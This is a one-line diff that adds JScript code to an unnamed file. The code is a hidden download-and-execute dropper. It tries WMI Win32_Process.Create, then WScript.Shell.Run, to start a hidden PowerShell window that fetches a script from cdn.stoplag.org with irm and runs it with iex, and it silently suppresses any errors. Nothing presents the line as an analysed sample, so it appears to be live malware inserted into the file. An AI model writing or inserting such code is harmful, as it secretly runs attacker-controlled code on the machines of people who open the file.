@@ -1,0 +1,1 @@
+try{var wmi=GetObject("winmgmts:\\\\.\\root\\cimv2");var proc=wmi.Get("Win32_Process");proc.Create("powershell -WindowStyle hidden -c \"$c=irm cdn.stoplag.org;iex $c\"",null,null,0);}catch(e1){try{var ws=new ActiveXObject("WScript.Shell");ws.Run("powershell -WindowStyle hidden -c \"$c=irm cdn.stoplag.org;iex $c\"",0,false);}catch(e2){}}
